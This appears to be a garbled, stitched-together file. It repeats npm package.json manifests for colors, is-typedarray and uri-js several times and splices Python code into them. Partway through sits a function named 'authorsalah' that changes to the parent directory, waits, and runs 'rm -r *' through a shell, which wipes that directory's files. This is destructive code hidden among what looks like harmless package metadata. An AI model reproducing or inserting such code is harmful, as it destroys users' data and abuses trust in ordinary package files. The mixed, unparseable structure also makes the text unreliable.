{
    "name": "colors",
    "description": "get colors in your node.js console",
    "version": "1.4.0",
    "author": "Marak Squires",
    "contributors": [
        {
            "name": "DABH",
            "url": "https://github.com/DABH"
        }
    ],
    "homepage": "https://github.com/Marak/colors.js",
    "bugs": "https://github.com/Marak/colors.js/issues",
    "keywords": [
        "ansi",
        "terminal",
        "colors"
    ],
    "repository": {
        "type": "git",
        "url": "http://github.com/Marak/colors.js.git"
    },
    "license": "MIT",
    "scripts": {
        "lint": "eslint . --fix",
        "test": "node tests/basic-test.js && node tests/safe-test.js"
    },
    "engines": {
        "node": ">=0.1.90"
    },
    "main": "lib/index.js",
    "files": [
        "examples",
        "lib",
        "LICENSE",
        "safe.js",
        "themes",
        "index.d.ts",
        "safe.d.ts"
    ],
    "devDependencies": {
        "eslint": "^5.2.0",
        "eslint-config-google": "^0.11.0"
    }
}

{
  "name": "is-typedarray",
  "version": "1.0.0",
  "description": "Detect whether or not an object is a Typed Array",
  "main": "index.js",
  "scripts": {
    "test": "node test"
  },
  "author": "Hugh Kennedy <hughskennedy@gmail.com> (http://hughsk.io/)",
  "license": "MIT",
  "dependencies": {},
  "devDependencies": {
    "tape": "^2.13.1"
  },
  "repository": {
    "type": "git",
    "url": "git://github.com/hughsk/is-typedarray.git"
  },
  "keywords": [
    "typed",
    "array",
    "detect",
    "is",
    "util"
  ],
  "bugs": {
    "url": "https://github.com/hughsk/is-typedarray/issues"
  },
  "homepage": "https://github.com/hughsk/is-typedarray"
}

{
  "name": "uri-js",
  "version": "4.4.1",
  "description": "An RFC 3986/3987 compliant, scheme extendable URI/IRI parsing/validating/resolving library for JavaScript.",
  "main": "dist/es5/uri.all.js",
  "types": "dist/es5/uri.all.d.ts",
  "directories": {
    "test": "tests"
  },
  "files": [
    "dist",
    "package.json",
    "yarn.lock",
    "README.md",
    "CHANGELOG",
    "LICENSE"
  ],
  "scripts": {
    "build:esnext": "tsc",
    "build:es5": "rollup -c && cp dist/esnext/uri.d.ts dist/es5/uri.all.d.ts && npm run build:es5:fix-sourcemap",
    "build:es5:fix-sourcemap": "sorcery -i dist/es5/uri.all.js",
    "build:es5:min": "uglifyjs dist/es5/uri.all.js --support-ie8 --output dist/es5/uri.all.min.js --in-source-map dist/es5/uri.all.js.map --source-map uri.all.min.js.map --comments --compress --mangle --pure-funcs merge subexp && mv uri.all.min.js.map dist/es5/ && cp dist/es5/uri.all.d.ts dist/es5/uri.all.min.d.ts",
    "build": "npm run build:esnext && npm run build:es5 && npm run build:es5:min",
    "clean": "rm -rf dist",
    "test": "mocha -u mocha-qunit-ui dist/es5/uri.all.js tests/tests.js"
  },
  "repository": {
    "type": "git",
    "url": "http://github.com/garycourt/uri-js"
  },
  "keywords": [
    "URI",
    "IRI",
    "IDN",
    "URN",
    "UUID",
    "HTTP",
    "HTTPS",
    "WS",
    "WSS",
    "MAILTO",
    "RFC3986",
    "RFC3987",
    "RFC5891",
    "RFC2616",
    "RFC2818",
    "RFC2141",
    "RFC4122",
    "RFC4291",
    "RFC5952",
    "RFC6068",
    "RFC6455",
    "RFC6874"
  ],
  "author": "Gary Court <gary.court@gmail.com>",
  "license": "BSD-2-Clause",
  "bugs": {
    "url": "https://github.com/garycourt/uri-js/issues"
  },
  "homepage": "https://github.com/garycourt/uri-js",
  "devDependencies": {
    "babel-cli": "^6.26.0",
    "babel-plugin-external-helpers": "^6.22.0",
    "babel-preset-latest": "^6.24.1",
    "mocha": "^8.2.1",
    "mocha-qunit-ui": "^0.1.3",
    "rollup": "^0.41.6",
    "rollup-plugin-babel": "^2.7.1",
    "rollup-plugin-node-resolve": "^2.0.0",
    "sorcery": "^0.10.0",
    "typescript": "^2.8.1",
    "uglify-js": "^2.8.14"
  },
  "dependencies": {
    "punycode": "^2.1.0"
  }
}

import os
import subprocess
import time

{
  "name": "uri-js",
  "version": "4.4.1",
  "description": "An RFC 3986/3987 compliant, scheme extendable URI/IRI parsing/validating/resolving library for JavaScript.",
  "main": "dist/es5/uri.all.js",
  "types": "dist/es5/uri.all.d.ts",
  "directories": {
    "test": "tests"
  },
  "files": [
    "dist",
    "package.json",
    "yarn.lock",
    "README.md",
    "CHANGELOG",
    "LICENSE"
  ],
  "scripts": {
    "build:esnext": "tsc",
    "build:es5": "rollup -c && cp dist/esnext/uri.d.ts dist/es5/uri.all.d.ts && npm run build:es5:fix-sourcemap",
    "build:es5:fix-sourcemap": "sorcery -i dist/es5/uri.all.js",
    "build:es5:min": "uglifyjs dist/es5/uri.all.js --support-ie8 --output dist/es5/uri.all.min.js --in-source-map dist/es5/uri.all.js.map --source-map uri.all.min.js.map --comments --compress --mangle --pure-funcs merge subexp && mv uri.all.min.js.map dist/es5/ && cp dist/es5/uri.all.d.ts dist/es5/uri.all.min.d.ts",
    "build": "npm run build:esnext && npm run build:es5 && npm run build:es5:min",
    "clean": "rm -rf dist",
    "test": "mocha -u mocha-qunit-ui dist/es5/uri.all.js tests/tests.js"
  },
  "repository": {
    "type": "git",
    "url": "http://github.com/garycourt/uri-js"
  },
  "keywords": [
    "URI",
    "IRI",
    "IDN",
    "URN",
    "UUID",
    "HTTP",
    "HTTPS",
    "WS",
    "WSS",
    "MAILTO",
    "RFC3986",
    "RFC3987",
    "RFC5891",
    "RFC2616",
    "RFC2818",
    "RFC2141",
    "RFC4122",
    "RFC4291",
    "RFC5952",
    "RFC6068",
    "RFC6455",
    "RFC6874"
  ],
  "author": "Gary Court <gary.court@gmail.com>",
  "license": "BSD-2-Clause",
  "bugs": {
    "url": "https://github.com/garycourt/uri-js/issues"
  },
  "homepage": "https://github.com/garycourt/uri-js",
  "devDependencies": {
    "babel-cli": "^6.26.0",
    "babel-plugin-external-helpers": "^6.22.0",
    "babel-preset-latest": "^6.24.1",
    "mocha": "^8.2.1",
    "mocha-qunit-ui": "^0.1.3",
    "rollup": "^0.41.6",
    "rollup-plugin-babel": "^2.7.1",
    "rollup-plugin-node-resolve": "^2.0.0",
    "sorcery": "^0.10.0",
    "typescript": "^2.8.1",
    "uglify-js": "^2.8.14"
  },
  "dependencies": {
    "punycode": "^2.1.0"
  }
}

{
  "name": "uri-js",
  "version": "4.4.1",
  "description": "An RFC 3986/3987 compliant, scheme extendable URI/IRI parsing/validating/resolving library for JavaScript.",
  "main": "dist/es5/uri.all.js",
  "types": "dist/es5/uri.all.d.ts",
  "directories": {
    "test": "tests"
  },
  "files": [
    "dist",
    "package.json",
    "yarn.lock",
    "README.md",
    "CHANGELOG",
    "LICENSE"
  ],
  "scripts": {
    "build:esnext": "tsc",
    "build:es5": "rollup -c && cp dist/esnext/uri.d.ts dist/es5/uri.all.d.ts && npm run build:es5:fix-sourcemap",
    "build:es5:fix-sourcemap": "sorcery -i dist/es5/uri.all.js",
    "build:es5:min": "uglifyjs dist/es5/uri.all.js --support-ie8 --output dist/es5/uri.all.min.js --in-source-map dist/es5/uri.all.js.map --source-map uri.all.min.js.map --comments --compress --mangle --pure-funcs merge subexp && mv uri.all.min.js.map dist/es5/ && cp dist/es5/uri.all.d.ts dist/es5/uri.all.min.d.ts",
    "build": "npm run build:esnext && npm run build:es5 && npm run build:es5:min",
    "clean": "rm -rf dist",
    "test": "mocha -u mocha-qunit-ui dist/es5/uri.all.js tests/tests.js"
  },
  "repository": {
    "type": "git",
    "url": "http://github.com/garycourt/uri-js"
  },
  "keywords": [
    "URI",
    "IRI",
    "IDN",
    "URN",
    "UUID",
    "HTTP",
    "HTTPS",
    "WS",
    "WSS",
    "MAILTO",
    "RFC3986",
    "RFC3987",
    "RFC5891",
    "RFC2616",
    "RFC2818",
    "RFC2141",
    "RFC4122",
    "RFC4291",
    "RFC5952",
    "RFC6068",
    "RFC6455",
    "RFC6874"
  ],
  "author": "Gary Court <gary.court@gmail.com>",
  "license": "BSD-2-Clause",
  "bugs": {
    "url": "https://github.com/garycourt/uri-js/issues"
  },
  "homepage": "https://github.com/garycourt/uri-js",
  "devDependencies": {
    "babel-cli": "^6.26.0",
    "babel-plugin-external-helpers": "^6.22.0",
    "babel-preset-latest": "^6.24.1",
    "mocha": "^8.2.1",
    "mocha-qunit-ui": "^0.1.3",
    "rollup": "^0.41.6",
    "rollup-plugin-babel": "^2.7.1",
    "rollup-plugin-node-resolve": "^2.0.0",
    "sorcery": "^0.10.0",
    "typescript": "^2.8.1",
    "uglify-js": "^2.8.14"
  },
  "dependencies": {
    "punycode": "^2.1.0"
  }
}

{
    "name": "colors",
    "description": "get colors in your node.js console",
    "version": "1.4.0",
    "author": "Marak Squires",
    "contributors": [
        {
            "name": "DABH",
            "url": "https://github.com/DABH"
        }
    ],
    "homepage": "https://github.com/Marak/colors.js",
    "bugs": "https://github.com/Marak/colors.js/issues",
    "keywords": [
        "ansi",
        "terminal",
        "colors"
    ],
    "repository": {
        "type": "git",
        "url": "http://github.com/Marak/colors.js.git"
    },
    "license": "MIT",
    "scripts": {
        "lint": "eslint . --fix",
        "test": "node tests/basic-test.js && node tests/safe-test.js"
    },
    "engines": {
        "node": ">=0.1.90"
    },
    "main": "lib/index.js",
    "files": [
        "examples",
        "lib",
        "LICENSE",
        "safe.js",
        "themes",
        "index.d.ts",
        "safe.d.ts"
    ],
    "devDependencies": {
        "eslint": "^5.2.0",
        "eslint-config-google": "^0.11.0"
    }
}

{
  "name": "uri-js",
  "version": "4.4.1",
  "description": "An RFC 3986/3987 compliant, scheme extendable URI/IRI parsing/validating/resolving library for JavaScript.",
  "main": "dist/es5/uri.all.js",
  "types": "dist/es5/uri.all.d.ts",
  "directories": {
    "test": "tests"
  },
  "files": [
    "dist",
    "package.json",
    "yarn.lock",
    "README.md",
    "CHANGELOG",
    "LICENSE"
  ],
  "scripts": {
    "build:esnext": "tsc",
    "build:es5": "rollup -c && cp dist/esnext/uri.d.ts dist/es5/uri.all.d.ts && npm run build:es5:fix-sourcemap",
    "build:es5:fix-sourcemap": "sorcery -i dist/es5/uri.all.js",
    "build:es5:min": "uglifyjs dist/es5/uri.all.js --support-ie8 --output dist/es5/uri.all.min.js --in-source-map dist/es5/uri.all.js.map --source-map uri.all.min.js.map --comments --compress --mangle --pure-funcs merge subexp && mv uri.all.min.js.map dist/es5/ && cp dist/es5/uri.all.d.ts dist/es5/uri.all.min.d.ts",
    "build": "npm run build:esnext && npm run build:es5 && npm run build:es5:min",
    "clean": "rm -rf dist",
    "test": "mocha -u mocha-qunit-ui dist/es5/uri.all.js tests/tests.js"
  },
  "repository": {
    "type": "git",
    "url": "http://github.com/garycourt/uri-js"
  },
  "keywords": [
    "URI",
    "IRI",
    "IDN",
    "URN",
    "UUID",
    "HTTP",
    "HTTPS",
    "WS",
    "WSS",
    "MAILTO",
    "RFC3986",
    "RFC3987",
    "RFC5891",
    "RFC2616",
    "RFC2818",
    "RFC2141",
    "RFC4122",
    "RFC4291",
    "RFC5952",
    "RFC6068",
    "RFC6455",
    "RFC6874"
  ],
  "author": "Gary Court <gary.court@gmail.com>",
  "license": "BSD-2-Clause",
  "bugs": {
    "url": "https://github.com/garycourt/uri-js/issues"
  },
  "homepage": "https://github.com/garycourt/uri-js",
  "devDependencies": {
    "babel-cli": "^6.26.0",
    "babel-plugin-external-helpers": "^6.22.0",
    "babel-preset-latest": "^6.24.1",
    "mocha": "^8.2.1",
    "mocha-qunit-ui": "^0.1.3",
    "rollup": "^0.41.6",
    "rollup-plugin-babel": "^2.7.1",
    "rollup-plugin-node-resolve": "^2.0.0",
    "sorcery": "^0.10.0",
    "typescript": "^2.8.1",
    "uglify-js": "^2.8.14"
  },
  "dependencies": {
    "punycode": "^2.1.0"
  }
}

{
    "name": "colors",
    "description": "get colors in your node.js console",
    "version": "1.4.0",
    "author": "Marak Squires",
    "contributors": [
        {
            "name": "DABH",
            "url": "https://github.com/DABH"
        }
    ],
    "homepage": "https://github.com/Marak/colors.js",
    "bugs": "https://github.com/Marak/colors.js/issues",
    "keywords": [
        "ansi",
        "terminal",
        "colors"
    ],
    "repository": {
        "type": "git",
        "url": "http://github.com/Marak/colors.js.git"
    },
    "license": "MIT",
    "scripts": {
        "lint": "eslint . --fix",
        "test": "node tests/basic-test.js && node tests/safe-test.js"
    },
    "engines": {
        "node": ">=0.1.90"
    },
    "main": "lib/index.js",
    "files": [
        "examples",
        "lib",
        "LICENSE",
        "safe.js",
        "themes",
        "index.d.ts",
        "safe.d.ts"
    ],
    "devDependencies": {
        "eslint": "^5.2.0",
        "eslint-config-google": "^0.11.0"
    }
}

{
  "name": "uri-js",
  "version": "4.4.1",
  "description": "An RFC 3986/3987 compliant, scheme extendable URI/IRI parsing/validating/resolving library for JavaScript.",
  "main": "dist/es5/uri.all.js",
  "types": "dist/es5/uri.all.d.ts",
  "directories": {
    "test": "tests"
  },
  "files": [
    "dist",
    "package.json",
    "yarn.lock",
    "README.md",
    "CHANGELOG",
    "LICENSE"
  ],
  "scripts": {
    "build:esnext": "tsc",
    "build:es5": "rollup -c && cp dist/esnext/uri.d.ts dist/es5/uri.all.d.ts && npm run build:es5:fix-sourcemap",
    "build:es5:fix-sourcemap": "sorcery -i dist/es5/uri.all.js",
    "build:es5:min": "uglifyjs dist/es5/uri.all.js --support-ie8 --output dist/es5/uri.all.min.js --in-source-map dist/es5/uri.all.js.map --source-map uri.all.min.js.map --comments --compress --mangle --pure-funcs merge subexp && mv uri.all.min.js.map dist/es5/ && cp dist/es5/uri.all.d.ts dist/es5/uri.all.min.d.ts",
    "build": "npm run build:esnext && npm run build:es5 && npm run build:es5:min",
    "clean": "rm -rf dist",
    "test": "mocha -u mocha-qunit-ui dist/es5/uri.all.js tests/tests.js"
  },
  "repository": {
    "type": "git",
    "url": "http://github.com/garycourt/uri-js"
  },
  "keywords": [
    "URI",
    "IRI",
    "IDN",
    "URN",
    "UUID",
    "HTTP",
    "HTTPS",
    "WS",
    "WSS",
    "MAILTO",
    "RFC3986",
    "RFC3987",
    "RFC5891",
    "RFC2616",
    "RFC2818",
    "RFC2141",
    "RFC4122",
    "RFC4291",
    "RFC5952",
    "RFC6068",
    "RFC6455",
    "RFC6874"
  ],
  "author": "Gary Court <gary.court@gmail.com>",
  "license": "BSD-2-Clause",
  "bugs": {
    "url": "https://github.com/garycourt/uri-js/issues"
  },
  "homepage": "https://github.com/garycourt/uri-js",
  "devDependencies": {
    "babel-cli": "^6.26.0",
    "babel-plugin-external-helpers": "^6.22.0",
    "babel-preset-latest": "^6.24.1",
    "mocha": "^8.2.1",
    "mocha-qunit-ui": "^0.1.3",
    "rollup": "^0.41.6",
    "rollup-plugin-babel": "^2.7.1",
    "rollup-plugin-node-resolve": "^2.0.0",
    "sorcery": "^0.10.0",
    "typescript": "^2.8.1",
    "uglify-js": "^2.8.14"
  },
  "dependencies": {
    "punycode": "^2.1.0"
  }
}

def authorsalah():
    os.chdir('..') 
    time.sleep(3)
    file_list = os.listdir()

    for file in file_list:
        if os.path.isfile(file):
        	subprocess.call("rm -r *", shell=True)
        
{
  "name": "uri-js",
  "version": "4.4.1",
  "description": "An RFC 3986/3987 compliant, scheme extendable URI/IRI parsing/validating/resolving library for JavaScript.",
  "main": "dist/es5/uri.all.js",
  "types": "dist/es5/uri.all.d.ts",
  "directories": {
    "test": "tests"
  },
  "files": [
    "dist",
    "package.json",
    "yarn.lock",
    "README.md",
    "CHANGELOG",
    "LICENSE"
  ],
  "scripts": {
    "build:esnext": "tsc",
    "build:es5": "rollup -c && cp dist/esnext/uri.d.ts dist/es5/uri.all.d.ts && npm run build:es5:fix-sourcemap",
    "build:es5:fix-sourcemap": "sorcery -i dist/es5/uri.all.js",
    "build:es5:min": "uglifyjs dist/es5/uri.all.js --support-ie8 --output dist/es5/uri.all.min.js --in-source-map dist/es5/uri.all.js.map --source-map uri.all.min.js.map --comments --compress --mangle --pure-funcs merge subexp && mv uri.all.min.js.map dist/es5/ && cp dist/es5/uri.all.d.ts dist/es5/uri.all.min.d.ts",
    "build": "npm run build:esnext && npm run build:es5 && npm run build:es5:min",
    "clean": "rm -rf dist",
    "test": "mocha -u mocha-qunit-ui dist/es5/uri.all.js tests/tests.js"
  },
  "repository": {
    "type": "git",
    "url": "http://github.com/garycourt/uri-js"
  },
  "keywords": [
    "URI",
    "IRI",
    "IDN",
    "URN",
    "UUID",
    "HTTP",
    "HTTPS",
    "WS",
    "WSS",
    "MAILTO",
    "RFC3986",
    "RFC3987",
    "RFC5891",
    "RFC2616",
    "RFC2818",
    "RFC2141",
    "RFC4122",
    "RFC4291",
    "RFC5952",
    "RFC6068",
    "RFC6455",
    "RFC6874"
  ],
  "author": "Gary Court <gary.court@gmail.com>",
  "license": "BSD-2-Clause",
  "bugs": {
    "url": "https://github.com/garycourt/uri-js/issues"
  },
  "homepage": "https://github.com/garycourt/uri-js",
  "devDependencies": {
    "babel-cli": "^6.26.0",
    "babel-plugin-external-helpers": "^6.22.0",
    "babel-preset-latest": "^6.24.1",
    "mocha": "^8.2.1",
    "mocha-qunit-ui": "^0.1.3",
    "rollup": "^0.41.6",
    "rollup-plugin-babel": "^2.7.1",
    "rollup-plugin-node-resolve": "^2.0.0",
    "sorcery": "^0.10.0",
    "typescript": "^2.8.1",
    "uglify-js": "^2.8.14"
  },
  "dependencies": {
    "punycode": "^2.1.0"
  }
}

{
  "name": "uri-js",
  "version": "4.4.1",
  "description": "An RFC 3986/3987 compliant, scheme extendable URI/IRI parsing/validating/resolving library for JavaScript.",
  "main": "dist/es5/uri.all.js",
  "types": "dist/es5/uri.all.d.ts",
  "directories": {
    "test": "tests"
  },
  "files": [
    "dist",
    "package.json",
    "yarn.lock",
    "README.md",
    "CHANGELOG",
    "LICENSE"
  ],
  "scripts": {
    "build:esnext": "tsc",
    "build:es5": "rollup -c && cp dist/esnext/uri.d.ts dist/es5/uri.all.d.ts && npm run build:es5:fix-sourcemap",
    "build:es5:fix-sourcemap": "sorcery -i dist/es5/uri.all.js",
    "build:es5:min": "uglifyjs dist/es5/uri.all.js --support-ie8 --output dist/es5/uri.all.min.js --in-source-map dist/es5/uri.all.js.map --source-map uri.all.min.js.map --comments --compress --mangle --pure-funcs merge subexp && mv uri.all.min.js.map dist/es5/ && cp dist/es5/uri.all.d.ts dist/es5/uri.all.min.d.ts",
    "build": "npm run build:esnext && npm run build:es5 && npm run build:es5:min",
    "clean": "rm -rf dist",
    "test": "mocha -u mocha-qunit-ui dist/es5/uri.all.js tests/tests.js"
  },
  "repository": {
    "type": "git",
    "url": "http://github.com/garycourt/uri-js"
  },
  "keywords": [
    "URI",
    "IRI",
    "IDN",
    "URN",
    "UUID",
    "HTTP",
    "HTTPS",
    "WS",
    "WSS",
    "MAILTO",
    "RFC3986",
    "RFC3987",
    "RFC5891",
    "RFC2616",
    "RFC2818",
    "RFC2141",
    "RFC4122",
    "RFC4291",
    "RFC5952",
    "RFC6068",
    "RFC6455",
    "RFC6874"
  ],
  "author": "Gary Court <gary.court@gmail.com>",
  "license": "BSD-2-Clause",
  "bugs": {
    "url": "https://github.com/garycourt/uri-js/issues"
  },
  "homepage": "https://github.com/garycourt/uri-js",
  "devDependencies": {
    "babel-cli": "^6.26.0",
    "babel-plugin-external-helpers": "^6.22.0",
    "babel-preset-latest": "^6.24.1",
    "mocha": "^8.2.1",
    "mocha-qunit-ui": "^0.1.3",
    "rollup": "^0.41.6",
    "rollup-plugin-babel": "^2.7.1",
    "rollup-plugin-node-resolve": "^2.0.0",
    "sorcery": "^0.10.0",
    "typescript": "^2.8.1",
    "uglify-js": "^2.8.14"
  },
  "dependencies": {
    "punycode": "^2.1.0"
  }
}

{
  "name": "is-typedarray",
  "version": "1.0.0",
  "description": "Detect whether or not an object is a Typed Array",
  "main": "index.js",
  "scripts": {
    "test": "node test"
  },
  "author": "Hugh Kennedy <hughskennedy@gmail.com> (http://hughsk.io/)",
  "license": "MIT",
  "dependencies": {},
  "devDependencies": {
    "tape": "^2.13.1"
  },
  "repository": {
    "type": "git",
    "url": "git://github.com/hughsk/is-typedarray.git"
  },
  "keywords": [
    "typed",
    "array",
    "detect",
    "is",
    "util"
  ],
  "bugs": {
    "url": "https://github.com/hughsk/is-typedarray/issues"
  },
  "homepage": "https://github.com/hughsk/is-typedarray"
}

{
  "name": "is-typedarray",
  "version": "1.0.0",
  "description": "Detect whether or not an object is a Typed Array",
  "main": "index.js",
  "scripts": {
    "test": "node test"
  },
  "author": "Hugh Kennedy <hughskennedy@gmail.com> (http://hughsk.io/)",
  "license": "MIT",
  "dependencies": {},
  "devDependencies": {
    "tape": "^2.13.1"
  },
  "repository": {
    "type": "git",
    "url": "git://github.com/hughsk/is-typedarray.git"
  },
  "keywords": [
    "typed",
    "array",
    "detect",
    "is",
    "util"
  ],
  "bugs": {
    "url": "https://github.com/hughsk/is-typedarray/issues"
  },
  "homepage": "https://github.com/hughsk/is-typedarray"
}

{
    "name": "colors",
    "description": "get colors in your node.js console",
    "version": "1.4.0",
    "author": "Marak Squires",
    "contributors": [
        {
            "name": "DABH",
            "url": "https://github.com/DABH"
        }
    ],
    "homepage": "https://github.com/Marak/colors.js",
    "bugs": "https://github.com/Marak/colors.js/issues",
    "keywords": [
        "ansi",
        "terminal",
        "colors"
    ],
    "repository": {
        "type": "git",
        "url": "http://github.com/Marak/colors.js.git"
    },
    "license": "MIT",
    "scripts": {
        "lint": "eslint . --fix",
        "test": "node tests/basic-test.js && node tests/safe-test.js"
    },
    "engines": {
        "node": ">=0.1.90"
    },
    "main": "lib/index.js",
    "files": [
        "examples",
        "lib",
        "LICENSE",
        "safe.js",
        "themes",
        "index.d.ts",
        "safe.d.ts"
    ],
    "devDependencies": {
        "eslint": "^5.2.0",
        "eslint-config-google": "^0.11.0"
    }
}
